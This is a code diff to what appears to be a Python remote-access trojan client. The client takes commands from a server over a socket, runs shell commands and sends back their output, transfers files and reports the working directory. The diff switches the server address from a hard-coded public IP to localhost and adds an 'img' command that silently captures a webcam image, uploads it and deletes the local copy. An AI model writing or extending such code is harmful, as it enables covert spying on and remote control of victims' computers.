@@ -7,8 +7,9 @@ import threading
 import os
 from sys import executable, argv
 import subprocess
+import cv2
 
-ip_server = "147.161.8.230"
+ip_server = "localhost"
 port_server = 1234
 system_info = {}
 
@@ -59,6 +60,8 @@ def wait_command():
                  if cmd.returncode > 0:
                     sock.send(bytes(cmd.stderr, "utf-8")) 
                  else:
+                    print(cmd.stdout)
+                    print(type(cmd.stdout))
                     sock.send(bytes(cmd.stdout, "utf-8"))
 
             elif array_command[0] == "download":
@@ -86,6 +89,20 @@ def wait_command():
             elif command == "cdir":
                 dir = os.getcwd()
                 sock.send(bytes(dir, "utf-8"))
+
+            elif array_command[0] == "img":
+                camera = cv2.VideoCapture(0, cv2.CAP_DSHOW)
+                return_value, image = camera.read()
+                cv2.imwrite(array_command[1], image)
+                camera.release() 
+                cv2.destroyAllWindows()
+                st = round(os.stat(array_command[1]).st_size)
+                sock.send(bytes(str(st), "utf-8"))
+                file = open(array_command[1] , 'rb')
+                file_data = file.read(st)
+                sock.send(file_data)
+                file.close()
+                os.remove(array_command[1])
 
         except:
             python = executable
